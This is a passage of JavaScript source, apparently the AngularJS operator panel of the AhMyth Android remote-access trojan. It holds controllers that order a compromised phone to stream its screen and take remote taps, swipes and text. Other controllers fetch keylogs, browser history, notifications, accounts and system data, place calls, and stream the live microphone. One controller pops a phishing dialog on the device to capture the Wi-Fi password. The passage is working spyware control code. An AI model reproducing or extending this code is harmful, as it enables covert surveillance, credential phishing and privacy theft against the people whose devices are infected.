                logInput('SWIPE', `${(dragStart.x * 100).toFixed(0)}%→${(endCoords.x * 100).toFixed(0)}%`);
                
                socket.emit(ORDER, {
                    order: input,
                    action: 'swipe',
                    startX: dragStart.x,
                    startY: dragStart.y,
                    endX: endCoords.x,
                    endY: endCoords.y,
                    duration: 300,
                    normalized: true
                });
            }
        }
        
        dragStart = null;
        isDragging = false;
    };
    
    $ScreenCtrl.sendKey = (key) => {
        logInput('KEY', key.toUpperCase());
        socket.emit(ORDER, {
            order: input,
            action: 'key',
            key: key
        });
    };
    
    $ScreenCtrl.sendText = () => {
        if (!$ScreenCtrl.textToSend) return;
        
        logInput('TEXT', $ScreenCtrl.textToSend.substring(0, 20) + '...');
        socket.emit(ORDER, {
            order: input,
            action: 'text',
            text: $ScreenCtrl.textToSend
        });
        $ScreenCtrl.textToSend = '';
    };
    
    $ScreenCtrl.handleTextKeypress = (event) => {
        if (event.keyCode === 13) { // Enter
            $ScreenCtrl.sendText();
        }
    };
    
    // ============ Stream Controls ============
    
    $ScreenCtrl.getScreenInfo = () => {
        socket.emit(ORDER, { order: screen, extra: 'info' });
    };
    
    $ScreenCtrl.startStream = () => {
        // Don't start if permission is still required
        if ($ScreenCtrl.permissionRequired && !$ScreenCtrl.permissionGranted) {
            $rootScope.Log('[⚠] Please grant screen capture permission first', CONSTANTS.logStatus.WARNING);
            return;
        }
        
        $ScreenCtrl.isLoading = true;
        $ScreenCtrl.frameCount = 0;
        $ScreenCtrl.awaitingPermission = false;
        fpsCounter = 0;
        $rootScope.Log('[→] Starting remote desktop stream...', CONSTANTS.logStatus.INFO);
        
        // Request first frame
        socket.emit(ORDER, { order: screen, extra: 'capture' });
        
        // Set up polling for frames - but skip if awaiting permission
        streamInterval = $interval(() => {
            if ($ScreenCtrl.isStreaming && !$ScreenCtrl.awaitingPermission) {
                socket.emit(ORDER, { order: screen, extra: 'capture' });
            }
        }, parseInt($ScreenCtrl.fps));
        
        // FPS counter
        fpsTimer = $interval(() => {
            $ScreenCtrl.actualFps = fpsCounter;
            fpsCounter = 0;
        }, 1000);
        
        $ScreenCtrl.isStreaming = true;
    };
    
    $ScreenCtrl.stopStream = () => {
        $ScreenCtrl.isStreaming = false;
        $ScreenCtrl.isLoading = false;
        
        if (streamInterval) {
            $interval.cancel(streamInterval);
            streamInterval = null;
        }
        if (fpsTimer) {
            $interval.cancel(fpsTimer);
            fpsTimer = null;
        }
        $ScreenCtrl.actualFps = 0;
        
        $rootScope.Log('[→] Remote desktop stream stopped', CONSTANTS.logStatus.INFO);
    };
    
    $ScreenCtrl.captureFrame = () => {
        $ScreenCtrl.isLoading = true;
        $rootScope.Log('[→] Capturing screen...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: screen, extra: 'capture' });
    };
    
    $ScreenCtrl.refreshScreen = () => {
        socket.emit(ORDER, { order: screen, extra: 'capture' });
    };
    
    $ScreenCtrl.setQuality = () => {
        socket.emit(ORDER, { order: screen, extra: 'setQuality', quality: parseInt($ScreenCtrl.quality) });
    };
    
    $ScreenCtrl.setFps = () => {
        if (streamInterval) {
            $interval.cancel(streamInterval);
            streamInterval = $interval(() => {
                if ($ScreenCtrl.isStreaming) {
                    socket.emit(ORDER, { order: screen, extra: 'capture' });
                }
            }, parseInt($ScreenCtrl.fps));
        }
    };
    
    $ScreenCtrl.requestPermission = () => {
        $rootScope.Log('[→] Requesting screen capture permission on device...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: screen, extra: 'request' });
        
        // Show feedback
        $ScreenCtrl.permissionRequesting = true;
        $timeout(() => {
            $ScreenCtrl.permissionRequesting = false;
        }, 5000);
    };
    
    $ScreenCtrl.saveScreenshot = () => {
        if (!$ScreenCtrl.currentFrame) return;
        
        $rootScope.Log('[→] Saving screenshot...', CONSTANTS.logStatus.INFO);
        
        var base64Data = $ScreenCtrl.currentFrame;
        var filename = 'Screenshot_' + Date.now() + '.jpg';
        var filePath = path.join(downloadsPath, filename);
        
        fs.outputFile(filePath, Buffer.from(base64Data, 'base64'), (err) => {
            if (err) {
                $rootScope.Log('[✗] Failed to save screenshot', CONSTANTS.logStatus.FAIL);
            } else {
                $rootScope.Log(`[✓] Screenshot saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
            }
        });
    };
    
    $ScreenCtrl.openFullscreen = () => {
        if (!$ScreenCtrl.currentFrame) return;
        let win = window.open('', '_blank', 'width=540,height=960');
        win.document.write(`
            <html>
            <head><title>Remote Desktop - Fullscreen</title></head>
            <body style="margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh;">
            <img src="data:image/jpeg;base64,${$ScreenCtrl.currentFrame}" style="max-width:100%;max-height:100%;object-fit:contain;">
            </body>
            </html>
        `);
    };
    
    // Auto-retry on permission grant
    $rootScope.$on('PermissionGranted', (event, permission) => {
        if (permission.toLowerCase().includes('screen') && $ScreenCtrl.awaitingPermission) {
            $rootScope.Log('[→] Permission granted! Starting screen stream...', CONSTANTS.logStatus.INFO);
            $ScreenCtrl.permissionGranted = true;
            $ScreenCtrl.awaitingPermission = false;
            $ScreenCtrl.startStream();
        }
    });

    // ============ Socket Handlers ============
    
    socket.on(screen, (data) => {
        $ScreenCtrl.isLoading = false;
        
        if (data.success === false) {
            if (data.permissionRequested) {
                // Permission dialog was shown on device - STOP spamming
                if (!$ScreenCtrl.awaitingPermission) {
                    $rootScope.Log('[✓] Permission dialog shown on device. User must tap "Start Now"', CONSTANTS.logStatus.SUCCESS);
                }
                $ScreenCtrl.permissionRequired = true;
                $ScreenCtrl.awaitingPermission = true;  // Stop sending capture requests
                $ScreenCtrl.permissionGranted = false;
                
                // Stop the stream interval to prevent spam
                if (streamInterval) {
                    $interval.cancel(streamInterval);
                    streamInterval = null;
                }
            } else if (data.error && data.error.toLowerCase().includes('permission')) {
                if (!$ScreenCtrl.awaitingPermission) {
                    $ScreenCtrl.permissionRequired = true;
                    $ScreenCtrl.awaitingPermission = true;
                    $rootScope.Log('[⚠] Screen capture permission required on device', CONSTANTS.logStatus.WARNING);
                    
                    // Stop the stream interval
                    if (streamInterval) {
                        $interval.cancel(streamInterval);
                        streamInterval = null;
                    }
                }
            } else if (data.error && (data.error.toLowerCase().includes('no image') || data.error.toLowerCase().includes('unavailable'))) {
                // Don't stop streaming on temporary image errors - just log and continue
                $rootScope.Log('[⚠] Waiting for screen data...', CONSTANTS.logStatus.WARNING);
                // Don't stop streaming, just wait for next frame
            } else {
                $rootScope.Log(`[✗] Screen error: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
                // Only stop streaming on critical errors, not temporary ones
                if (data.error && !data.error.toLowerCase().includes('timeout')) {
                    if ($ScreenCtrl.isStreaming) {
                        // Don't auto-stop, let user decide
                    }
                }
            }
        } else if (data.message && data.message.includes('permission')) {
            // Permission request sent successfully
            $rootScope.Log(`[✓] ${data.message}`, CONSTANTS.logStatus.SUCCESS);
            if (data.instruction) {
                $rootScope.Log(`[→] ${data.instruction}`, CONSTANTS.logStatus.INFO);
            }
        } else if (data.image) {
            $ScreenCtrl.frameCount++;
            $ScreenCtrl.lastFrameSize = (data.size / 1024).toFixed(1);
            $ScreenCtrl.permissionRequired = false;
            $ScreenCtrl.awaitingPermission = false;
            $ScreenCtrl.permissionGranted = true;
            
            // Restart stream interval if it was stopped due to permission
            if ($ScreenCtrl.isStreaming && !streamInterval) {
                streamInterval = $interval(() => {
                    if ($ScreenCtrl.isStreaming && !$ScreenCtrl.awaitingPermission) {
                        socket.emit(ORDER, { order: screen, extra: 'capture' });
                    }
                }, parseInt($ScreenCtrl.fps));
            }
            
            // Update screen info from frame
            if (data.width && data.height) {
                $ScreenCtrl.screenInfo.width = data.width;
                $ScreenCtrl.screenInfo.height = data.height;
            }
            
            renderFrame(data.image, data.width, data.height);
            
            if ($ScreenCtrl.frameCount === 1) {
                $rootScope.Log('[✓] Remote desktop active', CONSTANTS.logStatus.SUCCESS);
            }
        } else if (data.width && data.height && !data.image) {
            $ScreenCtrl.screenInfo = data;
            $rootScope.Log(`[✓] Screen: ${data.width}x${data.height}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.quality) {
            $rootScope.Log(`[✓] Quality: ${data.quality}%`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.isCapturing !== undefined) {
            // Status response
            $rootScope.Log(`[✓] Screen capture status: ${data.isCapturing ? 'Active' : 'Inactive'}`, CONSTANTS.logStatus.INFO);
            if (data.isCapturing) {
                $ScreenCtrl.permissionRequired = false;
            }
        } else {
            console.log('[AhMyth] Received screen data:', data);
        }
        
        if (!$ScreenCtrl.$$phase) {
            $ScreenCtrl.$apply();
        }
    });
    
    socket.on(input, (data) => {
        if (data.success) {
            // Input command succeeded
        } else {
            $rootScope.Log(`[✗] Input failed: ${data.error || 'Unknown'}`, CONSTANTS.logStatus.FAIL);
        }
    });
    
    // Initialize
    setTimeout(() => {
        initCanvas();
        $ScreenCtrl.getScreenInfo();
    }, 100);
});

//-----------------------Keylogger Controller------------------------
app.controller("KeyloggerCtrl", function ($scope, $rootScope) {
    $KeyloggerCtrl = $scope;
    $KeyloggerCtrl.keylogs = [];
    $KeyloggerCtrl.isLoading = false;
    $KeyloggerCtrl.keyloggerEnabled = false;
    $KeyloggerCtrl.keylogCount = 0;
    $KeyloggerCtrl.uniqueApps = [];
    $KeyloggerCtrl.barLimit = 50;
    
    var keylogger = CONSTANTS.orders.keylogger || 'x0000kl';

    $KeyloggerCtrl.$on('$destroy', () => {
        socket.removeAllListeners(keylogger);
    });

    $KeyloggerCtrl.getKeylogs = () => {
        $KeyloggerCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching keylogs...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: keylogger, extra: 'get' });
    };

    $KeyloggerCtrl.clearKeylogs = () => {
        $KeyloggerCtrl.keylogs = [];
        $KeyloggerCtrl.keylogCount = 0;
        $KeyloggerCtrl.uniqueApps = [];
        $rootScope.Log('[→] Clearing keylogs...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: keylogger, extra: 'clear' });
    };

    $KeyloggerCtrl.exportKeylogs = () => {
        if ($KeyloggerCtrl.keylogs.length === 0) return;
        
        var content = "Timestamp,App,Type,Content\n";
        $KeyloggerCtrl.keylogs.forEach(log => {
            content += `${new Date(log.timestamp).toLocaleString()},${log.app},${log.type},"${log.content.replace(/"/g, '""')}"\n`;
        });
        
        var filePath = path.join(downloadsPath, "Keylogs_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export keylogs', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Keylogs exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $KeyloggerCtrl.increaseLimit = () => {
        $KeyloggerCtrl.barLimit += 50;
    };

    $KeyloggerCtrl.getTypeIcon = (type) => {
        switch(type) {
            case 'TEXT': return 'keyboard icon';
            case 'WINDOW': return 'window maximize icon';
            case 'NOTIFICATION': return 'bell icon';
            default: return 'file alternate icon';
        }
    };

    $KeyloggerCtrl.copyLog = (log) => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(log.content);
            $rootScope.Log('[✓] Copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    socket.on(keylogger, (data) => {
        $KeyloggerCtrl.isLoading = false;
        
        if (data.logs) {
            $KeyloggerCtrl.keylogs = data.logs;
            $KeyloggerCtrl.keylogCount = data.logs.length;
            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
            
            // Extract unique apps
            const apps = new Set(data.logs.map(l => l.app));
            $KeyloggerCtrl.uniqueApps = Array.from(apps).sort();
            
            $rootScope.Log(`[✓] Received ${data.logs.length} keylogs`, CONSTANTS.logStatus.SUCCESS);
            $KeyloggerCtrl.$apply();
        } else if (data.status) {
            $KeyloggerCtrl.keyloggerEnabled = data.enabled;
            $KeyloggerCtrl.$apply();
        }
    });

    // Initial load
    $KeyloggerCtrl.getKeylogs();
});

//-----------------------Browser History Controller------------------------
app.controller("BrowserHistoryCtrl", function ($scope, $rootScope) {
    $BrowserCtrl = $scope;
    $BrowserCtrl.history = [];
    $BrowserCtrl.bookmarks = [];
    $BrowserCtrl.searches = [];
    $BrowserCtrl.isLoading = false;
    $BrowserCtrl.activeTab = 'history';
    $BrowserCtrl.barLimit = 50;
    
    var browserHistory = CONSTANTS.orders.browserHistory || 'x0000bh';

    $BrowserCtrl.$on('$destroy', () => {
        socket.removeAllListeners(browserHistory);
    });

    $BrowserCtrl.getHistory = () => {
        $BrowserCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching browser data...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: browserHistory });
    };

    $BrowserCtrl.exportHistory = () => {
        var content = "";
        
        if ($BrowserCtrl.activeTab === 'history') {
            content = "Date,Title,URL,Visits\n";
            $BrowserCtrl.history.forEach(item => {
                content += `${new Date(item.date).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}",${item.visits}\n`;
            });
        } else if ($BrowserCtrl.activeTab === 'bookmarks') {
            content = "Created,Title,URL\n";
            $BrowserCtrl.bookmarks.forEach(item => {
                content += `${new Date(item.created).toLocaleString()},"${(item.title||'').replace(/"/g, '""')}","${item.url}"\n`;
            });
        } else {
            content = "Date,Query\n";
            $BrowserCtrl.searches.forEach(item => {
                content += `${new Date(item.date).toLocaleString()},"${(item.query||'').replace(/"/g, '""')}"\n`;
            });
        }
        
        var filePath = path.join(downloadsPath, "Browser_" + $BrowserCtrl.activeTab + "_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export data', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Data exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $BrowserCtrl.increaseLimit = () => {
        $BrowserCtrl.barLimit += 50;
    };

    socket.on(browserHistory, (data) => {
        $BrowserCtrl.isLoading = false;
        
        if (data.history) {
            $BrowserCtrl.history = data.history;
            $BrowserCtrl.bookmarks = data.bookmarks || [];
            $BrowserCtrl.searches = data.searches || [];
            
            $rootScope.Log(`[✓] Received browser data: ${data.history.length} history items`, CONSTANTS.logStatus.SUCCESS);
            $BrowserCtrl.$apply();
        } else {
            $rootScope.Log('[⚠] No browser data found or permission denied', CONSTANTS.logStatus.WARNING);
        }
    });

    // Initial load
    $BrowserCtrl.getHistory();
});

//-----------------------Notifications Controller------------------------
app.controller("NotificationsCtrl", function ($scope, $rootScope) {
    $NotifCtrl = $scope;
    $NotifCtrl.notifications = [];
    $NotifCtrl.isLoading = false;
    $NotifCtrl.notificationEnabled = false;
    $NotifCtrl.notificationCount = 0;
    $NotifCtrl.uniqueApps = [];
    $NotifCtrl.barLimit = 50;
    
    var notifications = CONSTANTS.orders.notifications || 'x0000nt';

    $NotifCtrl.$on('$destroy', () => {
        socket.removeAllListeners(notifications);
    });

    $NotifCtrl.getNotifications = () => {
        $NotifCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching notifications...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: notifications, extra: 'all' });
    };

    $NotifCtrl.getActiveNotifications = () => {
        $NotifCtrl.isLoading = true;
        $rootScope.Log('[→] Fetching active notifications...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: notifications, extra: 'active' });
    };

    $NotifCtrl.clearNotifications = () => {
        $NotifCtrl.notifications = [];
        $NotifCtrl.notificationCount = 0;
        $rootScope.Log('[→] Clearing notifications...', CONSTANTS.logStatus.INFO);
        // Note: This only clears local view, usually we don't clear on device unless specified
    };

    $NotifCtrl.exportNotifications = () => {
        if ($NotifCtrl.notifications.length === 0) return;
        
        var content = "Timestamp,App,Title,Text,Action\n";
        $NotifCtrl.notifications.forEach(n => {
            content += `${new Date(n.timestamp).toLocaleString()},${n.appName},"${(n.title||'').replace(/"/g, '""')}","${(n.text||'').replace(/"/g, '""')}",${n.action}\n`;
        });
        
        var filePath = path.join(downloadsPath, "Notifications_" + Date.now() + ".csv");
        fs.outputFile(filePath, content, (err) => {
            if (err)
                $rootScope.Log('[✗] Failed to export notifications', CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] Notifications exported: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
        });
    };

    $NotifCtrl.increaseLimit = () => {
        $NotifCtrl.barLimit += 50;
    };

    socket.on(notifications, (data) => {
        $NotifCtrl.isLoading = false;
        
        if (data.notifications) {
            $NotifCtrl.notifications = data.notifications;
            $NotifCtrl.notificationCount = data.notifications.length;
            $NotifCtrl.notificationEnabled = data.enabled;
            
            // Extract unique apps
            const apps = new Set(data.notifications.map(n => n.appName));
            $NotifCtrl.uniqueApps = Array.from(apps).sort();
            
            $rootScope.Log(`[✓] Received ${data.notifications.length} notifications`, CONSTANTS.logStatus.SUCCESS);
            $NotifCtrl.$apply();
        } else if (data.status) {
            $NotifCtrl.notificationEnabled = data.enabled;
            $NotifCtrl.$apply();
        }
    });

    // Initial load
    $NotifCtrl.getNotifications();
});

//-----------------------System Info Controller------------------------
app.controller("SystemInfoCtrl", function ($scope, $rootScope) {
    $SysInfoCtrl = $scope;
    $SysInfoCtrl.systemData = null;
    $SysInfoCtrl.isLoading = false;
    $SysInfoCtrl.activeTab = 'battery';
    
    var systemInfo = CONSTANTS.orders.systemInfo || 'x0000si';

    $SysInfoCtrl.$on('$destroy', () => {
        socket.removeAllListeners(systemInfo);
    });

    $SysInfoCtrl.getAllSystemInfo = () => {
        $SysInfoCtrl.isLoading = true;
        $rootScope.Log('[→] Scanning system...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: systemInfo });
    };

    $SysInfoCtrl.formatUptime = (millis) => {
        if (!millis) return '0s';
        const seconds = Math.floor(millis / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        const days = Math.floor(hours / 24);
        
        if (days > 0) return `${days}d ${hours % 24}h`;
        if (hours > 0) return `${hours}h ${minutes % 60}m`;
        return `${minutes}m ${seconds % 60}s`;
    };

    $SysInfoCtrl.formatBytes = (bytes) => {
        if (!bytes || bytes === 0) return '0 B';
        const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return (bytes / Math.pow(1024, i)).toFixed(2) + ' ' + sizes[i];
    };

    $SysInfoCtrl.formatTime = (millis) => {
        if (!millis) return '0s';
        const seconds = Math.floor(millis / 1000);
        const minutes = Math.floor(seconds / 60);
        const hours = Math.floor(minutes / 60);
        
        if (hours > 0) return `${hours}h ${minutes % 60}m`;
        return `${minutes}m ${seconds % 60}s`;
    };

    $SysInfoCtrl.getBatteryClass = (level) => {
        if (level <= 15) return 'battery-low';
        if (level <= 40) return 'battery-medium';
        return 'battery-high';
    };

    $SysInfoCtrl.getAccountIcon = (type) => {
        if (type.includes('google')) return 'google icon';
        if (type.includes('facebook')) return 'facebook icon';
        if (type.includes('twitter')) return 'twitter icon';
        if (type.includes('whatsapp')) return 'whatsapp icon';
        if (type.includes('telegram')) return 'telegram icon';
        return 'user circle icon';
    };

    $SysInfoCtrl.getImportanceClass = (importance) => {
        if (importance === 'Foreground') return 'badge--success';
        if (importance === 'Visible') return 'badge--info';
        return 'badge--default';
    };

    socket.on(systemInfo, (data) => {
        $SysInfoCtrl.isLoading = false;
        $SysInfoCtrl.systemData = data;
        $rootScope.Log('[✓] System analysis complete', CONSTANTS.logStatus.SUCCESS);
        $SysInfoCtrl.$apply();
    });

    // Initial load
    $SysInfoCtrl.getAllSystemInfo();
});

//-----------------------Make Call Controller------------------------
app.controller("MakeCallCtrl", function ($scope, $rootScope) {
    $MakeCallCtrl = $scope;
    $MakeCallCtrl.phoneNumber = '';
    $MakeCallCtrl.callHistory = [];
    
    var makeCall = CONSTANTS.orders.makeCall || 'x0000mc2';

    $MakeCallCtrl.$on('$destroy', () => {
        socket.removeAllListeners(makeCall);
    });

    $MakeCallCtrl.makeCall = () => {
        if (!$MakeCallCtrl.phoneNumber) {
            $rootScope.Log('[✗] Please enter a phone number', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        $rootScope.Log(`[→] Initiating call to ${$MakeCallCtrl.phoneNumber}...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: makeCall, phoneNumber: $MakeCallCtrl.phoneNumber });
        
        // Add to history
        $MakeCallCtrl.callHistory.unshift({
            number: $MakeCallCtrl.phoneNumber,
            time: new Date().toLocaleTimeString()
        });
        
        if ($MakeCallCtrl.callHistory.length > 10) {
            $MakeCallCtrl.callHistory.pop();
        }
    };

    socket.on(makeCall, (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] Call initiated to ${data.phoneNumber}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Failed to make call: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        $MakeCallCtrl.$apply();
    });
});

//-----------------------Live Mic Controller------------------------
app.controller("LiveMicCtrl", function ($scope, $rootScope, $interval) {
    $LiveMicCtrl = $scope;
    $LiveMicCtrl.isStreaming = false;
    $LiveMicCtrl.streamDuration = '00:00:00';
    $LiveMicCtrl.audioChunks = 0;
    $LiveMicCtrl.volume = 100;
    $LiveMicCtrl.isMuted = false;
    
    var liveMic = CONSTANTS.orders.liveMic || 'x0000lm2';
    var streamTimer = null;
    var startTime = null;
    var audioContext = null;
    var gainNode = null;
    var audioQueue = [];
    var isPlaying = false;
    
    // Recording vars
    var mediaRecorder = null;
    var recordedChunks = [];
    var destNode = null;

    // Initialize Web Audio API
    function initAudio() {
        try {
            audioContext = new (window.AudioContext || window.webkitAudioContext)({
                sampleRate: 44100
            });
            gainNode = audioContext.createGain();
            gainNode.connect(audioContext.destination);
            gainNode.gain.value = $LiveMicCtrl.volume / 100;
            
            // Setup recording destination
            destNode = audioContext.createMediaStreamDestination();
            gainNode.connect(destNode);
            
            $rootScope.Log('[✓] Audio context initialized', CONSTANTS.logStatus.SUCCESS);
        } catch (e) {
            $rootScope.Log(`[✗] Failed to init audio: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    }

    $LiveMicCtrl.startRecording = () => {
        if (!destNode) return;
        
        try {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(destNode.stream);
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) {
                    recordedChunks.push(e.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                saveRecording();
            };
            
            mediaRecorder.start();
            $LiveMicCtrl.isRecording = true;
            $rootScope.Log('[●] Recording started', CONSTANTS.logStatus.INFO);
        } catch (e) {
            $rootScope.Log(`[✗] Failed to start recording: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
    };

    $LiveMicCtrl.stopRecording = () => {
        if (mediaRecorder && $LiveMicCtrl.isRecording) {
            mediaRecorder.stop();
            $LiveMicCtrl.isRecording = false;
            $rootScope.Log('[■] Recording stopped, saving...', CONSTANTS.logStatus.INFO);
        }
    };

    function saveRecording() {
        if (recordedChunks.length === 0) return;
        
        const blob = new Blob(recordedChunks, { type: 'audio/webm' });
        const reader = new FileReader();
        reader.onload = () => {
            const buffer = Buffer.from(reader.result);
            const filename = `LiveMic_${Date.now()}.webm`;
            const savePath = path.join(downloadsPath, filename);
            
            fs.outputFile(savePath, buffer, (err) => {
                if (err) {
                    $rootScope.Log(`[✗] Failed to save recording: ${err.message}`, CONSTANTS.logStatus.FAIL);
                } else {
                    $rootScope.Log(`[✓] Recording saved: ${savePath}`, CONSTANTS.logStatus.SUCCESS);
                }
            });
        };
        reader.readAsArrayBuffer(blob);
    }

    // Play audio buffer
    function playAudioChunk(audioData) {
        if (!audioContext || audioContext.state === 'closed') return;
        
        try {
            // Resume audio context if suspended (browser autoplay policy)
            if (audioContext.state === 'suspended') {
                audioContext.resume();
            }
            
            // Convert base64 or binary data to ArrayBuffer
            var arrayBuffer;
            if (typeof audioData === 'string') {
                // Base64 encoded
                var binary = atob(audioData);
                arrayBuffer = new ArrayBuffer(binary.length);
                var bytes = new Uint8Array(arrayBuffer);
                for (var i = 0; i < binary.length; i++) {
                    bytes[i] = binary.charCodeAt(i);
                }
            } else if (audioData.buffer) {
                // Binary data from socket
                arrayBuffer = new Uint8Array(audioData.buffer).buffer;
            } else {
                arrayBuffer = audioData;
            }
            
            // Decode and play audio
            audioContext.decodeAudioData(arrayBuffer, function(buffer) {
                var source = audioContext.createBufferSource();
                source.buffer = buffer;
                source.connect(gainNode);
                source.start(0);
            }, function(err) {
                // Try raw PCM playback if decode fails
                playRawPCM(arrayBuffer);
            });
        } catch (e) {
            console.error('Audio playback error:', e);
        }
    }
    
    // Play raw PCM data (fallback) - Android sends 16000 Hz mono PCM16
    function playRawPCM(arrayBuffer) {
        try {
            var samples = new Int16Array(arrayBuffer);
            var floatSamples = new Float32Array(samples.length);
            
            // Check if data is all zeros (silence/no permission)
            var hasAudio = false;
            for (var i = 0; i < samples.length; i++) {
                floatSamples[i] = samples[i] / 32768.0;
                if (samples[i] !== 0) hasAudio = true;
            }
            
            if (!hasAudio && samples.length > 0) {
                console.warn('Received silent audio - microphone may not have permission');
            }
            
            // Use 16000 Hz to match Android recording sample rate
            var buffer = audioContext.createBuffer(1, floatSamples.length, 16000);
            buffer.getChannelData(0).set(floatSamples);
            
            var source = audioContext.createBufferSource();
            source.buffer = buffer;
            source.connect(gainNode);
            source.start(0);
        } catch (e) {
            console.error('Raw PCM playback error:', e);
        }
    }

    $LiveMicCtrl.$on('$destroy', () => {
        socket.removeAllListeners(liveMic);
        if (streamTimer) $interval.cancel(streamTimer);
        if (audioContext && audioContext.state !== 'closed') {
            audioContext.close();
        }
    });

    $LiveMicCtrl.startStream = () => {
        if (!audioContext) {
            initAudio();
        }
        
        $LiveMicCtrl.isStreaming = true;
        $LiveMicCtrl.audioChunks = 0;
        startTime = Date.now();
        
        $rootScope.Log('[→] Starting live microphone stream...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: liveMic, action: 'start' });
        
        // Update duration timer
        streamTimer = $interval(() => {
            var elapsed = Math.floor((Date.now() - startTime) / 1000);
            var hours = Math.floor(elapsed / 3600);
            var minutes = Math.floor((elapsed % 3600) / 60);
            var seconds = elapsed % 60;
            $LiveMicCtrl.streamDuration = 
                String(hours).padStart(2, '0') + ':' +
                String(minutes).padStart(2, '0') + ':' +
                String(seconds).padStart(2, '0');
        }, 1000);
    };

    $LiveMicCtrl.stopStream = () => {
        $LiveMicCtrl.isStreaming = false;
        
        $rootScope.Log('[→] Stopping microphone stream...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: liveMic, action: 'stop' });
        
        if (streamTimer) {
            $interval.cancel(streamTimer);
            streamTimer = null;
        }
    };
    
    $LiveMicCtrl.setVolume = (vol) => {
        $LiveMicCtrl.volume = vol;
        if (gainNode) {
            gainNode.gain.value = $LiveMicCtrl.isMuted ? 0 : vol / 100;
        }
    };
    
    $LiveMicCtrl.toggleMute = () => {
        $LiveMicCtrl.isMuted = !$LiveMicCtrl.isMuted;
        if (gainNode) {
            gainNode.gain.value = $LiveMicCtrl.isMuted ? 0 : $LiveMicCtrl.volume / 100;
        }
    };

    // Auto-retry on permission grant
    $rootScope.$on('PermissionGranted', (event, permission) => {
        if ((permission.toLowerCase().includes('mic') || permission.toLowerCase().includes('record')) && !$LiveMicCtrl.isStreaming) {
             $rootScope.Log('[→] Permission granted! Starting mic stream...', CONSTANTS.logStatus.INFO);
             $LiveMicCtrl.startStream();
        }
    });

    socket.on(liveMic, (data) => {
        if (data.audio) {
            $LiveMicCtrl.audioChunks++;
            // Play the received audio data
            playAudioChunk(data.audio);
        } else if (data.started) {
            $rootScope.Log('[✓] Live microphone streaming started', CONSTANTS.logStatus.SUCCESS);
        } else if (data.stopped) {
            $rootScope.Log('[✓] Live microphone streaming stopped', CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $rootScope.Log(`[✗] Microphone error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        }
        
        if (!$LiveMicCtrl.$$phase) {
            $LiveMicCtrl.$apply();
        }
    });
});

//-----------------------WiFi Passwords Controller------------------------
app.controller("WiFiPasswordsCtrl", function ($scope, $rootScope) {
    $WiFiPwdCtrl = $scope;
    $WiFiPwdCtrl.wifiNetworks = [];
    $WiFiPwdCtrl.isLoading = false;
    $WiFiPwdCtrl.error = null;
    $WiFiPwdCtrl.capturedPassword = null;
    
    var wifiPasswords = CONSTANTS.orders.wifiPasswords || 'x0000wp';

    $WiFiPwdCtrl.$on('$destroy', () => {
        socket.removeAllListeners(wifiPasswords);
    });

    // Show phishing dialog to capture WiFi password
    $WiFiPwdCtrl.promptWifiPassword = () => {
        $rootScope.Log('[→] Showing WiFi password prompt on device...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifiPasswords, extra: 'prompt' });
    };

    $WiFiPwdCtrl.getWifiPasswords = () => {
        $WiFiPwdCtrl.isLoading = true;
        $WiFiPwdCtrl.error = null;
        $WiFiPwdCtrl.wifiNetworks = [];
        
        $rootScope.Log('[→] Retrieving WiFi passwords...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: wifiPasswords });
    };

    $WiFiPwdCtrl.copyPassword = (password) => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(password).then(() => {
                $rootScope.Log('[✓] Password copied to clipboard', CONSTANTS.logStatus.SUCCESS);
            });
        }
    };

    socket.on(wifiPasswords, (data) => {
        $WiFiPwdCtrl.isLoading = false;
        
        // Check if this is a captured password from phishing dialog
        if (data.password && data.ssid) {
            $WiFiPwdCtrl.capturedPassword = {
